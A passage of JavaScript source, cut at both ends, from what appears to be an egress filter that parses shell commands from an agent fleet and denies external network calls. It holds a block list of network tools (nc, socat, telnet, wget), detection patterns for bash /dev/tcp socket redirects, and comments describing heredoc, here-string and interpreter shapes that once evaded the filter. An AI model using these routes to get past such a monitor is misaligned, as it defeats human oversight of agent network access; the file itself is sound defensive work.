  if (!RUNNERS.has(word) || rest[0] !== 'run') return null
  let k = 1
  while (k < rest.length && rest[k].startsWith('-')) { if (RUNNER_VALUE.has(rest[k])) k++; k++ }
  const target = rest[k]
  if (target === undefined) return null
  const base = target.split('/').pop()
  if (SCRIPT_INTERPRETER.test(base) || SHELL_INTERPRETER.test(base)) return { word: base, rest: rest.slice(k + 1) }
  if (/\.py$/.test(base)) return { word: 'python3', rest: rest.slice(k) }
  return { word: base, rest: rest.slice(k + 1) }
}
export const NET_CLIENTS = new Set(['wget', 'nc', 'ncat', 'netcat', 'telnet', 'socat', 'http', 'https', 'xh', 'aria2c'])
const URL_CLIENT_VALUE = new Set(['-O', '-o', '-a', '-e', '-i', '-P', '-t', '-T', '-w', '-U', '-l', '-A', '-R', '-D', '-Q', '-B', '-d', '-x', '-s', '-j',
  '--header', '--post-data', '--post-file', '--body-data', '--body-file', '--method', '--user', '--password', '--http-user', '--http-password',
  '--referer', '--user-agent', '--output-document', '--output-file', '--append-output', '--directory-prefix', '--tries', '--timeout', '--wait',
  '--level', '--accept', '--reject', '--domains', '--quota', '--base', '--input-file', '--execute', '--load-cookies', '--save-cookies',
  '--auth', '--auth-type', '--session', '--session-read-only', '--output', '--verify', '--cert', '--cert-key', '--proxy', '--dir', '--out'])
const SOCKET_CLIENT_VALUE = new Set(['-p', '-s', '-w', '-x', '-X', '-i', '-q', '-I', '-O', '-T', '-V', '-e', '-c', '-m', '-d', '-o', '-g', '-G',
  '--exec', '--sh-exec', '--lua-exec', '--proxy', '--proxy-type', '--proxy-auth', '--source-port', '--source', '--wait', '--max-conns',
  '--output', '--hex-dump', '--delay'])
// The external destinations of a named client's argv (the words after the client).
export function clientDestinations(cmd, args) {
  const dests = []
  const add = (v) => { const h = destHost(v); if (h) dests.push(h) }
  const socketish = cmd === 'nc' || cmd === 'ncat' || cmd === 'netcat' || cmd === 'telnet'
  if (cmd === 'socat') {
    for (const a of args) {
      const m = /^(?:tcp[46]?|udp[46]?|tcp[46]?-connect|udp[46]?-connect|udp[46]?-sendto|sctp-connect|openssl|openssl-connect|ssl|socks4a?|proxy)[:]([^:,]+)/i.exec(a)
      if (m) add(m[1])
    }
    return dests.filter((h) => !isLocalHost(h))
  }
  // a listener has no outbound destination
  if (socketish && args.some((a) => a === '--listen' || /^-[A-Za-z]*l[A-Za-z]*$/.test(a))) return []
  const value = socketish ? SOCKET_CLIENT_VALUE : URL_CLIENT_VALUE
  let positional = 0
  for (let k = 0; k < args.length; k++) {
    const w = args[k]
    if (/^\d*[<>]/.test(w) || w === '&') { if (/^\d*(?:>>?|<)&?$/.test(w)) k++; continue } // redirection
    if (w === '--') continue
    if (w.startsWith('-') && w.length > 1) { if (value.has(w)) k++; continue }
    if (socketish) { if (positional === 0) add(w); positional++; continue } // host, then the port
    if (cmd === 'http' || cmd === 'https' || cmd === 'xh') {               // [METHOD] URL [items]
      if (positional === 0 && /^[A-Z]+$/.test(w)) continue
      if (positional === 0) add(w.startsWith(':') ? 'localhost' : w)      // `:3000/x` is localhost
      positional++
      continue
    }
    add(w) // wget, aria2c: every positional is a URL
  }
  return dests.filter((h) => !isLocalHost(h))
}
// The local modules judged code imports: python `import a.b` / `from a.b import` resolved under baseDir, a relative
// JS import/require resolved from baseDir. Only files that exist and can be read; [{ body, lang, dir }].
const JS_EXTS = ['', '.js', '.mjs', '.cjs', '.ts', '.mts', '/index.js', '/index.mjs']
function localImports(body, lang, baseDir) {
  const out = []
  if (!baseDir) return out
  if (lang === 'py') {
    for (const m of body.matchAll(/^[ \t]*(?:from[ \t]+([A-Za-z_][\w.]*)[ \t]+import\b|import[ \t]+([A-Za-z_][\w.]*(?:[ \t]*,[ \t]*[A-Za-z_][\w.]*)*))/gm)) {
      const names = m[1] ? [m[1]] : m[2].split(',').map((s) => s.trim())
      for (const name of names) {
        const rel = name.split('.').join('/')
        for (const cand of [join(baseDir, rel + '.py'), join(baseDir, rel, '__init__.py')]) {
          const b = readBody(cand)
          if (b !== null) { out.push({ body: b, lang: 'py', dir: dirname(cand) }); break }
        }
      }
    }
  } else if (lang === 'js') {
    for (const m of body.matchAll(/(?:\bfrom[ \t]*|\bimport[ \t]*\(?[ \t]*|\brequire[ \t]*\([ \t]*)['"](\.{1,2}\/[^'"]+)['"]/g)) {
      for (const ext of JS_EXTS) {
        const cand = resolve(baseDir, m[1] + ext)
        const b = readBody(cand)
        if (b !== null) { out.push({ body: b, lang: 'js', dir: dirname(cand) }); break }
      }
    }
  }
  return out
}
const IMPORT_DEPTH = 2
const IMPORT_FILES = 20
// The external destinations of a code body and of the local modules it imports (to IMPORT_DEPTH, IMPORT_FILES files),
// and the bodies read ({ body, lang }: the code itself first).
function bodyDestinations(body, lang, baseDir) {
  const hosts = new Set(codeDestinations(body, lang))
  const seen = new Set()
  const items = [{ body, lang }]
  let layer = [{ body, lang, dir: baseDir }]
  for (let d = 0; d < IMPORT_DEPTH && layer.length && seen.size < IMPORT_FILES; d++) {
    const next = []
    for (const item of layer) {
      for (const mod of localImports(item.body, item.lang, item.dir)) {
        const key = mod.dir + '\0' + mod.body.length + '\0' + mod.body.slice(0, 64)
        if (seen.has(key) || seen.size >= IMPORT_FILES) continue
        seen.add(key)
        for (const h of codeDestinations(mod.body, mod.lang)) hosts.add(h)
        next.push(mod)
        items.push({ body: mod.body, lang: mod.lang })
      }
    }
    layer = next
  }
  return { hosts: [...hosts], items }
}
// Code that can make a network call at all: a network primitive of its language in the code (not in a string or a
// comment), or a network client named anywhere (a subprocess / os.system command line). An environment URL reaches only
// such code as a destination: a preview script that reads one to answer that request from a local file (every other
// request aborted) has none, and was a false deny on the fleet's week. Browser automation is not a primitive (see
// NET_PRIMITIVE).
const NET_CLIENT_WORD = /\b(?:curl|wget|nc|ncat|netcat|socat|telnet|aria2c|xh)\b/
function netCapable(items) {
  return items.some(({ body, lang }) => NET_PRIMITIVE.test(maskCode(body, lang)) || NET_CLIENT_WORD.test(body))
}
// The hosts of external URLs assigned in the command to a name the code body reads FROM THE ENVIRONMENT (python
// os.environ / getenv, JS process.env, ruby ENV, perl $ENV{}, php getenv / $_ENV, a shell $NAME). A same-named variable
// of the code itself is not the environment and does not count.
function envUrlDestinations(body, env) {
  const out = []
  for (const [name, value] of Object.entries(env)) {
    const host = SCHEME.test(value) ? destHost(value) : null // a $VAR or templated host is not a literal destination
    if (!host || isLocalHost(host)) continue
    const n = name.replace(/[$]/g, '')
    const q = `\\s*['"]${n}['"]`
    // 95800e1d (4), K2: a bare $NAME counts only where the code expands it from the environment (os.path.expandvars).
    const shellRef = /\bexpandvars\b/.test(body) ? `|\\$\\{?${n}(?![A-Za-z0-9_])` : ''
    const reads = new RegExp(`environ(?:\\.get)?\\s*[\\[(]${q}|getenv\\s*\\(${q}|process\\.env(?:\\.${n}(?![A-Za-z0-9_])|\\s*\\[${q})|\\bENV\\s*\\[${q}|\\$ENV\\{\\s*${n}\\s*\\}|\\$_ENV\\s*\\[${q}${shellRef}`)
    if (reads.test(body)) out.push(host)
  }
  return out
}
// The environment this command gives the programs it starts, as far as the command itself sets it: the assignments
// before a command word (`NAME=v cmd`, `env NAME=v cmd`, `NAME=v` alone) and those of a declaration (export, declare,
// typeset, readonly, local). A NAME=v that is an ARGUMENT (`docker run -e NAME=v`, `make NAME=v`) is not, and neither
// is a line of a heredoc body (`live` has the bodies blanked).
const DECLARE = new Set(['export', 'declare', 'typeset', 'readonly', 'local'])
function envAssignments(live, masked) {
  const env = {}
  for (const [a, b] of spans(masked)) {
    const w = shellWords(live.slice(a, b))
    const u = unwrapLaunchers(w)
    const until = DECLARE.has(w[u.at]) ? w.length : u.at
    for (let k = 0; k < until; k++) {
      const m = /^([A-Za-z_][A-Za-z0-9_]*)=([\s\S]*)$/.exec(w[k])
      if (m) env[m[1]] = m[2]
    }
  }
  return env
}
// A case statement's header (`case WORD in`) and each of its pattern lists (after `in`, `;;`, `;&` or `;;&`, up to the
// `)`), in the masked text: the words there are patterns, and a `|` between them is not a pipe. A list with no `)` in
// this text runs to its end: lifting a `$(...)` that holds a case statement cuts it at the pattern's `)`.
function caseRanges(masked) {
  const out = []
  const patternList = (p) => {
    while (p < masked.length && /\s/.test(masked[p])) p++
    if (/^esac(?![\w-])/.test(masked.slice(p, p + 5))) return
    const close = masked.indexOf(')', p)
    out.push([p, close === -1 ? masked.length : close + 1])
  }
  for (const m of masked.matchAll(/(^|[;&|(\n]|\b(?:then|do|else)\b)([ \t]*case[ \t]+(?:\S+[ \t]+)?in)(?=\s)/g)) {
    const at = m.index + m[1].length
    out.push([at, at + m[2].length])
    patternList(at + m[2].length)
  }
  for (const m of masked.matchAll(/;;&?|;&/g)) patternList(m.index + m[0].length)
  return out
}
// The names this shell text defines as functions, at a command position (`name() {`, `function name`): a named client
// of that name is the function, not the program (`http() { ...; }` and then `http 8443 host` in a test script).
function definedFunctions(masked) {
  const out = new Set()
  for (const m of masked.matchAll(/(?:^|[;&|(){}\n])[ \t]*(?:function[ \t]+([A-Za-z_][\w.:-]*)|([A-Za-z_][\w.:-]*)[ \t]*\([ \t]*\))/g)) out.add(m[1] ?? m[2])
  return out
}
// `text` with the ranges blanked (newlines kept, length kept).
function blankRanges(text, ranges) {
  if (!ranges.length) return text
  const out = text.split('')
  for (const [s, e] of ranges) for (let k = s; k < e && k < out.length; k++) if (out[k] !== '\n') out[k] = ' '
  return out.join('')
}

// a9c7bee0 fix2: blank SHELL comments (length-preserving) so an apostrophe or `<<` in a comment is not
// read as an unterminated quote/heredoc. EGRESS-PATH ONLY -- maskInertLiterals and the self-pace gate are byte-identical.
// a9c7bee0 (c): this runs BEFORE liftSubstitutions inside classify (a comment's quote otherwise desyncs the lifter), so it
// skips over $()/backtick substitutions opaquely -- a comment INSIDE a substitution is that subshell's concern, blanked by
// the inner's own recursive classify. A `#` starts a comment only at an unquoted word boundary (prev char is start,
// whitespace, or ;&|()<newline>) and runs to end of line; a `#` mid-word (http://x#frag), inside a quote, a substitution,
// or a heredoc body is not a comment.
function blankShellComments(command) {
  const s = String(command ?? '')
  const out = s.split('')
  const blank = (a, b) => { for (let k = a; k < b; k++) if (out[k] !== '\n') out[k] = ' ' }
  const atBoundary = (idx) => idx === 0 || /\s/.test(s[idx - 1]) || ';&|()\n'.includes(s[idx - 1])
  let i = 0
  while (i < s.length) {
    const c = s[i]
    if (c === '\\' && i + 1 < s.length) { i += 2; continue }
    const here = /^<<-?\s*(?:'([^']*)'|"([^"]*)"|([A-Za-z_]\w*))/.exec(s.slice(i))
    if (here && atBoundary(i)) {
      const tag = here[1] ?? here[2] ?? here[3]
      i += here[0].length
      const nl = s.indexOf('\n', i)
      if (nl === -1) continue
      i = nl + 1
      const endRx = new RegExp(`^[ \\t]*${tag.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')}[ \\t]*$`, 'm')
      const rel = endRx.exec(s.slice(i))
      if (!rel) { i = s.length; continue }
      i += rel.index + rel[0].length
      continue
    }
    if (c === "'") { const e = s.indexOf("'", i + 1); if (e === -1) { i = s.length; continue } i = e + 1; continue }
    if (c === '$' && s[i + 1] === "'") { let j = i + 2; while (j < s.length && s[j] !== "'") j += s[j] === '\\' ? 2 : 1; if (j >= s.length) { i = s.length; continue } i = j + 1; continue }
    if (c === '$' && s[i + 1] === '(') { i = substEnd(s, i); continue }
    if (c === '`') { i = backtickEnd(s, i); continue }
    if (c === '"') { let j = i + 1; while (j < s.length && s[j] !== '"') j += s[j] === '\\' ? 2 : 1; if (j >= s.length) { i = s.length; continue } i = j + 1; continue }
    if (c === '#' && atBoundary(i)) { const nl = s.indexOf('\n', i); blank(i, nl === -1 ? s.length : nl); i = nl === -1 ? s.length : nl; continue }
    i += 1
  }
  return out.join('')
}

// f3667105: bash's BUILT-IN network pseudo-devices. `/dev/tcp/HOST/PORT` and `/dev/udp/HOST/PORT` are not real device
// files -- bash opens a socket to HOST:PORT whenever one is a REDIRECTION target (any fd, any redirect operator:
// `exec 3<>/dev/tcp/h/p`, `cat </dev/tcp/h/p`, `echo >/dev/udp/h/p`). No external client binary is involved, so the
// command-name and named-client readings miss it entirely (measured live 2026-10-16). Source: bash(1),
// REDIRECTION. This reads the redirect TARGETS of a span's live text: a target under /dev/tcp/ or /dev/udp/ is a
// network destination, its host is the third path segment, judged exactly like a client's (local/private/vendor pass,
// external denies). A host that is not a plain literal (a variable survived expansion, a substitution, a glob, or it is
// empty) is not statically decidable -> fail closed (the a9c7bee0 rule, which the lead's brief names for this card).
// A `/dev/tcp/...` word that is NOT a redirect target is a plain path string (the kernel has no such file): not matched.
// The redirect operator is the anchor, so a quoted or commented mention (already blanked in the live text) is not one.
const NET_DEV_REDIRECT = /(?:\d+)?(?:<>|>>|&>>?|>\||>&|<&|>|<)\s*(\/dev\/(?:tcp|udp)\/\S*)/gi
// Whether any /dev/tcp|udp redirect is present at all (used to fail an unbounded loop closed).
const DEV_NET_REDIRECT_PRESENT = /(?:\d+)?(?:<>|>>|&>>?|>\||>&|<&|>|<)\s*\/dev\/(?:tcp|udp)\//i
export function redirectNetDevices(text) {
  const hosts = []
  let nonLiteral = false
  NET_DEV_REDIRECT.lastIndex = 0
  let m
  while ((m = NET_DEV_REDIRECT.exec(text))) {
    const host = (m[1].split('/')[3] ?? '').toLowerCase()
    if (!host || /[$`*?[\]{}()~]/.test(host)) { nonLiteral = true; continue }
    if (!isLocalHost(host)) hosts.push(host)
  }
  return { hosts: [...new Set(hosts)], nonLiteral }
}

export function classify(command, depth = 0, vendorHosts = new Set(), vendorDomains = new Set(), ctx = {}) {
  const norm = String(command ?? '').replace(/\\\r?\n/g, ' ')
  // a9c7bee0 (c): blank shell COMMENTS before lifting. A comment's apostrophe or quote otherwise desyncs
  // liftSubstitutions' quote tracking, leaving a real $(...) inside "..." unlifted -> an unparseable
  // idezojel-behelyettesit (measured: 12 of 13 such top-level denials were a `# ... it's ...` comment before
  // the substitution). blankShellComments skips $()/backtick opaquely, so a comment inside a substitution is
  // left to the inner's recursive classify. Both are length-preserving, so offsets still align.
  const { stripped: lifted, inners, herestrings } = liftSubstitutions(blankShellComments(norm))
  const orig = lifted
  const masked = maskInertLiterals(orig)
  const parsed = masked !== null && masked.length === orig.length
  const funcs = new Set([...(ctx.funcs ?? []), ...(parsed ? definedFunctions(masked) : [])])
  const docs = parsed ? heredocBodies(orig, masked) : []
  // 95800e1d (4): the here-string feeds, kept apart from the heredoc bodies. The word stays in the command text (not blanked
  // like a heredoc body): a command that takes it as an argument is read as before (`xargs -n1 curl -s <<< "<url>"` was
  // denied on that reading, and blanking the word would let it through). It is read AS A FEED only where it is one: the
  // program of an interpreter or a shell (below, (d)) and the lines of a `read` (K5).
  const hdocs = parsed ? hereStringBodies(orig, herestrings) : []
  // The text a span's WORDS are read from: a heredoc body with its terminator line (the stdin of the command that
  // opened it; an interpreter or shell it is fed to judges it as a body, see (d)) and a case header or pattern list are
  // not commands of this shell, so they are blanked (structure still comes from the masked text).
  const liveText = parsed ? blankRanges(orig, [...docs.map((d) => [d.start, d.end]), ...caseRanges(masked)]) : orig
  // a value is handed on as ONE word (asWord): pasted raw into a child's text, a quoted message broke its quoting
  const realEnv = { ...(ctx.env ?? {}), ...Object.fromEntries(Object.entries(parsed ? envAssignments(liveText, masked) : {}).map(([k, v]) => [k, asWord(v)])) }
  if (depth < 4) {
    // a substitution runs in a subshell of this text: it sees its functions and its variables
    for (const inner of inners) { const r = classify(inner, depth + 1, vendorHosts, vendorDomains, { ...ctx, funcs, env: realEnv }); if (r.deny) return r }
  }
  if (!parsed) {
    // a9c7bee0 (A; fix2): fail-closed on an unparseable command that maskInertLiterals cannot
    // resolve. ONLY at depth 0 -- the Bash INPUT the agent submits, which is the injection surface. A recursively read
    // body (a script file, a sourced file, a bash -c string) that the masker cannot resolve keeps the prior best-effort
    // allow: valid scripts routinely trip the text masker (measured: 132 valid .sh, e.g. agent-msg.sh's nested $() in
    // quotes), a file on disk is not the typed input, and bash runs it. Shell comments are blanked above, so an
    // apostrophe or `<<` in a comment no longer counts as unterminated. The upstream second opinion shares
    // maskInertLiterals, so it sees the same unparseable input and never needs to re-decide it.
    if (depth !== 0) return { deny: false, reason: 'unparseable', hosts: [] }
    const branch = maskInertReason(orig)
    return { deny: true, reason: branch ? `unparseable-${branch}` : 'unparseable', hosts: [] }
  }
  const env = { ...(ctx.env ?? {}), ...collectAssignments(orig, masked) }
  const loops = collectLoops(orig, masked, env)
  // 95800e1d (4), K5: a `while read u; do ...; done <<< "URL"` (or `<<EOF` body, or `read u <<< "URL"`) binds u to the fed
  // lines in the same command, exactly like `for u in URL`: the values join the loop values (the upstream's reading).
  const reads = collectReads(orig, masked)
  for (const d of reads.length ? [...docs, ...hdocs] : []) {
    const c = commandWordAt(masked, d.at)
    if (c !== 'done' && c !== 'read') continue
    const text = d.quoted ? d.body : expand(d.body, env)
    for (const r of reads) for (const [v, vals] of Object.entries(readValues(text, r))) loops[v] = [...(loops[v] ?? []), ...vals]
  }
  // absolute path -> the heredoc `cat > PATH` wrote earlier in this command (or, for a command line a Python heredoc
  // starts, a file that body writes: ctx.written, see (f))
  const written = new Map(ctx.written ?? [])
  let cwd = ctx.cwd ?? null
  const absPath = (p) => (/[$`*?]/.test(p) ? null : isAbsolute(p) ? p : cwd ? resolve(cwd, p) : null)
  // The program an interpreter reads from a pipe: the upstream heredoc, the file it cats, or the text it prints;
  // null when it is none of these.
  const pipedProgram = (pa, pb) => {
    const pw = shellWords(expand(liveText.slice(pa, pb), env))
    const u = unwrapLaunchers(pw)
    const name = (pw[u.at] ?? '').split('/').pop()
    const args = pw.slice(u.at + 1)
    if (name === 'cat') {
      const doc = docs.find((d) => d.at >= pa && d.at < pb)
      if (doc) return doc.body
      const file = args.find((t) => !t.startsWith('-') && !/^\d*[<>]/.test(t))
      const abs = file ? absPath(file) : null
      return abs ? (written.get(abs) ?? readBody(abs)) : null
    }
    if (name === 'echo' || name === 'printf') return args.filter((t) => !/^-[neE]+$/.test(t)).join(' ')
    return null
  }
  const spanList = spans(masked)
  for (let si = 0; si < spanList.length; si++) {
    const [a, b, op] = spanList[si]
    const prevSpan = si > 0 ? spanList[si - 1] : null
    const mw = words(masked.slice(a, b))
    let i = 0
    while (i < mw.length && (/^[A-Za-z_][A-Za-z0-9_]*=/.test(mw[i]) || PREFIX_WORDS.has(mw[i]))) i++
    if (i >= mw.length) continue
    // Every loop reading AND the plain one: a loop variable can share its name with an assignment
    // elsewhere in the command (`for u in <local>; do ...; done; u=<external>; curl "$u"`), and a
    // loop-only reading would let the assigned value go unjudged.
    const plain = expand(liveText.slice(a, b), env)
    const variants = loopVariants(liveText.slice(a, b), env, loops)
    // (d) code bodies (see above): `cd`, a heredoc written to a file, an interpreter's heredoc or script.
    const av = shellWords(plain)
    const un = unwrapLaunchers(av)
    if (un.str && depth < 4) {
      const r = classify(un.str, depth + 1, vendorHosts, vendorDomains, { cwd, env: realEnv }) // a new process: no functions
      if (r.deny) return { deny: true, reason: `wrapped-${r.reason}`, hosts: r.hosts }
    }
    const j = un.at
    const first = av[j] ?? ''
    let word = first.split('/').pop()
    let rest = av.slice(j + 1)
    const run = unwrapRunner(word, rest)
    if (run) { word = run.word; rest = run.rest }
    if (word === 'npx' || word === 'bunx') { // npx [--no-install ...] tsx x.ts
      let k = 0
      while (k < rest.length && rest[k].startsWith('-')) k++
      if (SCRIPT_INTERPRETER.test((rest[k] ?? '').split('/').pop())) { word = rest[k].split('/').pop(); rest = rest.slice(k + 1) }
    }
    if (depth < 4) {
      let str = null; let strKind = null
      if (SHELL_INTERPRETER.test(word)) {
        const k = rest.findIndex((t) => SHELL_STRING_FLAG.test(t))
        if (k !== -1 && rest[k + 1] !== undefined) { str = rest[k + 1]; strKind = 'shell-string' }
      } else if (word === 'eval' && rest.length) { str = rest.join(' '); strKind = 'eval' }
      if (str !== null) {
        const r = classify(str, depth + 1, vendorHosts, vendorDomains, { cwd, env: realEnv, ...(strKind === 'eval' ? { funcs } : {}) })
        if (r.deny) return { deny: true, reason: `${strKind}-${r.reason}`, hosts: r.hosts }
      }
      if ((word === 'source' || word === '.') && rest[0]) {
        const abs = absPath(rest[0])
        const sbody = abs ? (written.get(abs) ?? readBody(abs)) : null
        if (sbody !== null) {
          const r = classify(sbody, depth + 1, vendorHosts, vendorDomains, { cwd, env: realEnv, funcs })
          if (r.deny) return { deny: true, reason: `sourced-${r.reason}`, hosts: r.hosts }
        }
      }
    }
    const here = docs.find((d) => d.at >= a && d.at < b)
    if (word === 'cd') {
      const dir = rest[0]
      cwd = dir === undefined || dir === '~' ? homedir() : dir === '-' ? null : absPath(dir)
    } else if ((word === 'cat' || word === 'tee') && here) {
      const p = writtenPath([word, ...rest])
      const abs = p ? absPath(p) : null
      if (abs) written.set(abs, here.body)
    } else {
      let body = null; let lang = null; let kind = null; let baseDir = cwd; let feed = null
      if (SCRIPT_INTERPRETER.test(word) || SHELL_INTERPRETER.test(word)) {
        const s = scriptOf(rest, word)
        lang = langOf(word)
        // a here-string word is the program when the interpreter has no other: scriptOf then reads that very word as
        // the script operand (`python3 <<< "..."`, `bash <<< '...'`)
        const hs = hdocs.find((d) => d.at >= a && d.at < b)
        if (s?.stdin && here) { body = here.body; kind = 'heredoc'; feed = here }
        else if (hs && s?.file === hs.body) { body = hs.body; kind = 'heredoc'; feed = hs }
        else if (s?.stdin && op === '|' && prevSpan) {
          body = pipedProgram(prevSpan[0], prevSpan[1]); kind = 'pipe-program'
          if (body === null) return { deny: true, reason: 'pipe-program-unknown', hosts: [] }
        } else if (s?.file) { const abs = absPath(s.file); if (abs) { body = written.get(abs) ?? readBody(abs); kind = 'script-file'; baseDir = dirname(abs) } }
      } else if (POWERSHELL.test(word)) {
        // 95800e1d (4), K4: `powershell.exe -Command - <<'PS'` reads its program from the heredoc
        const k = rest.findIndex((t) => PS_CODE_FLAG.test(t))
        const f = here ?? hdocs.find((d) => d.at >= a && d.at < b)
        if (k !== -1 && rest[k + 1] === '-' && f) { body = f.body; kind = 'heredoc'; lang = 'ps'; feed = f }
      } else if (first.includes('/')) {
        const abs = absPath(first)
        if (abs) { body = written.get(abs) ?? readBody(abs); lang = body === null ? null : shebangLang(body); kind = 'script-file'; baseDir = dirname(abs) }
      }
      if (body !== null && lang === 'sh') {
        if (depth < 4) {
          const r = classify(body, depth + 1, vendorHosts, vendorDomains, { cwd, env: realEnv })
          if (r.deny) return { deny: true, reason: `${kind}-${r.reason}`, hosts: r.hosts }
        }
      } else if (body !== null && lang) {
        // An unquoted-tag heredoc is expanded by the shell before the interpreter reads it: a loop variable or an
        // assignment of this command is its value there (`for u in <url>; do python3 - <<EOF ... '$u' ...`). The
        // body as written is judged too, so the expansion can only add a deny.
        const expanded = kind === 'heredoc' && !feed.quoted ? loopVariants(body, env, loops) : []
        if (expanded === null && netCapable([{ body, lang }])) return { deny: true, reason: `${kind}-loop-unbounded`, hosts: [] }
        for (const b of [body, ...(expanded ?? [])]) {
          const { hosts: own, items } = lang === 'ps' ? { hosts: [], items: [] } : bodyDestinations(b, lang, baseDir)
          const hosts = [...new Set([...own, ...(netCapable(items) ? envUrlDestinations(b, realEnv) : [])])]
            .filter((h) => !vendorHosts.has(h) && !hostInDomains(h, vendorDomains))
          if (hosts.length) return { deny: true, reason: `${kind}-external`, hosts }
          // 95800e1d (4), K1/K3/K4: the stdin program of a NON-Python interpreter (node, perl, ruby, php, deno, bun,
          // PowerShell) is judged by the upstream rule as well: a network primitive in the body and an external URL in it
          // deny, whatever the code does with the URL. The one relaxation of that rule is Python's (#1669: a body that
          // merely MENTIONS them in text), and this layer reads Python bodies itself, below. Before this, a perl, ruby or
          // php body was read only through codeDestinations (which does not know their calls), and a node body that only
          // mentioned a call passed; both are what the upstream test pins (relaxes ONLY Python).
          if (kind === 'heredoc' && lang !== 'py' && usesNetwork(word, b)) {
            const old = [...new Set([...b.matchAll(URL_RE)].map((m) => m[0]).filter(isExternal).map(hostOf))]
              .filter((h) => !vendorHosts.has(h) && !hostInDomains(h, vendorDomains))
            if (old.length) return { deny: true, reason: `${kind}-external`, hosts: old }
          }
          // (f): what a Python heredoc body runs besides its own calls
          if (kind === 'heredoc' && lang === 'py') {
            const plan = pythonBodyPlan(b)
            const hidden = plan.hosts.filter((h) => !vendorHosts.has(h) && !hostInDomains(h, vendorDomains))
            if (hidden.length) return { deny: true, reason: 'heredoc-hidden-external', hosts: hidden }
            if (depth < 4 && plan.runs.length) {
              const seen = new Map(written)
              for (const [p, content] of plan.written) { const abs = absPath(p); if (abs) seen.set(abs, content) }
              for (const run of plan.runs) {
                const r = classify(run, depth + 1, vendorHosts, vendorDomains, { cwd, env: realEnv, written: seen })
                if (r.deny) return { deny: true, reason: `heredoc-run-${r.reason}`, hosts: r.hosts }
              }
            }
          }
        }
      }
    }
    // f3667105: a /dev/tcp or /dev/udp redirect target is a network destination, independent of the command word (a bare
    // `exec 3<>/dev/tcp/...` has none). Structure comes from the MASKED span: an operator or target inside quotes is inert
    // (`echo ">/dev/tcp/x/y"` is data, not a redirect), exactly as the rest of this function reads structure. The host is
    // then expanded with this command's assignments and loop values. An unbounded loop with such a redirect fails closed.
    const rdMasked = masked.slice(a, b)
    const rdVariants = loopVariants(rdMasked, env, loops)
    // An unbounded loop (null), or one whose values are not static (a command substitution leaves an empty value set),
    // in a span that holds a redirect: the host cannot be enumerated -> fail closed.
    if ((rdVariants === null || rdVariants.length === 0) && DEV_NET_REDIRECT_PRESENT.test(expand(rdMasked, env))) {
      return { deny: true, reason: 'dev-net-redirect-loop-unbounded', hosts: [] }
    }
    for (const rt of rdVariants ?? []) {
      const rd = redirectNetDevices(rt)
      if (rd.nonLiteral) return { deny: true, reason: 'dev-net-redirect-nonliteral', hosts: [] }
      const rdHosts = rd.hosts.filter((h) => !vendorHosts.has(h) && !hostInDomains(h, vendorDomains))
      if (rdHosts.length) return { deny: true, reason: 'dev-net-redirect-external', hosts: rdHosts }
    }
    for (const text of [plain, ...(variants ?? [])]) {
      const tw = shellWords(text)
      const tu = unwrapLaunchers(tw)
      const cmd = (tw[tu.at] ?? '').split('/').pop()
      let target = null
      if (cmd === 'curl') target = 'curl'
      else if (NET_CLIENTS.has(cmd) && !funcs.has(cmd)) target = cmd
      else if ((INTERPRETER.test(cmd) || POWERSHELL.test(cmd)) && hasCodeFlag(cmd, tw.slice(tu.at + 1)) && usesNetwork(cmd, text)) target = 'one-liner'
      if (!target) continue
      // curl: the destination is read from the ARGV only. A URL inside a flag VALUE (-d, -e, -H, a
      // JSON payload) is data sent to wherever curl connects, not a destination. The fleet reports PR
      // links with a localhost curl whose -d JSON carries a github.com URL, and scanning the whole text
      // with URL_RE denied exactly that (#1514 re-review, measured on the merged head). An interpreter
      // one-liner has no argv to read, so its code is still scanned with URL_RE.
      let found
      if (target === 'curl') found = curlDestinations(tw.slice(tu.at + 1))
      else if (target === 'one-liner') found = [...text.matchAll(URL_RE)].map((m) => m[0]).filter(isExternal).map(hostOf)
      else found = clientDestinations(cmd, tw.slice(tu.at + 1))
      // the arguments xargs feeds from a pipe: the URLs of the upstream command
      if (tu.viaXargs && op === '|' && prevSpan) {
        found = [...found, ...[...orig.slice(prevSpan[0], prevSpan[1]).matchAll(URL_RE)].map((m) => m[0]).filter(isExternal).map(hostOf)]
      }
      // A listed vendor host (or a host under a listed domain) passes only by itself: any other
      // destination in the same call still denies.
      const hosts = [...new Set(found)].filter((h) => !vendorHosts.has(h) && !hostInDomains(h, vendorDomains))
      if (hosts.length) return { deny: true, reason: `${target}-external`, hosts }
      if (variants === null) return { deny: true, reason: `${target}-loop-unbounded`, hosts: [] }
    }
  }
  return { deny: false, reason: null, hosts: [] }
}

// 95800e1d (2026-10-12): where the upstream parser's verdict joins this layer's (see the hook entry). The upstream
// parser (a pinned copy of the develop blob d3c652fc whose code is byte-identical; one comment example is spelled in words:
// bash-egress-parser-upstream.mjs) reads shapes this
// layer misses: the heredoc body of an interpreter it does not parse (perl, ruby, php, PowerShell), a here-string fed to an
// interpreter or to a while-read loop, a loop it cannot unroll. Measured on the upstream test: 58 calls this layer allows
// and the upstream denies. Its verdict is taken wherever the fleet's real Bash traffic showed no false deny (2026-09-28 ->
// 2026-10-12, 543 563 commands: 0 new denies): every upstream deny, except 'heredoc-external' on a python or node heredoc,
// whose body this layer reads itself. There the upstream rule also denies a localhost call that carries an external URL as
// data (77 false denies on the same traffic: the google-dwd helper path, dashboard posts, own services).
// WHICH heredoc gave that deny (95800e1d (3)): matching the exception on the whole command text let a
// perl or ruby heredoc's external call through whenever the same command also held a harmless python or node heredoc, or
// only the TEXT `python3 - <<` (an echo, a comment). So the upstream is asked again, on the command with exactly the
// python- and node-read heredoc bodies blanked (found with this layer's own parse, so a quoted or commented opener is no
// heredoc): if it still denies, the deny came from another body and is taken; if not, it came from a python or node body,
// which this layer reads itself, and is not. No such body: taken. A re-ask that throws: taken (fail-closed). A command
// this layer cannot parse, or a caller without `again`: the text rule below, as before.
const PYNODE_HEREDOC = /\b(?:python3?(?:\.\d+)?|node)\b[^\n|;&<]*(?<!<)<<(?!<)/
export function upstreamVerdictApplies(command, head, again = null) {
  if (!head?.deny) return false
  if (head.reason !== 'heredoc-external') return true
  const raw = String(command ?? '')
  const blanked = typeof again === 'function' ? withoutPyNodeHeredocBodies(raw) : null
  if (blanked === null) return !PYNODE_HEREDOC.test(raw)
  if (blanked === raw) return true
  try { return again(blanked)?.deny === true } catch { return true }
}
// The command with the bodies of the heredocs a python or node interpreter reads blanked (newlines and terminator lines
// kept), or null when this layer cannot parse it. The offsets are this layer's (continuation lines joined, substitutions
// lifted, both length-aware), mapped back to the raw text.
export function withoutPyNodeHeredocBodies(command) {
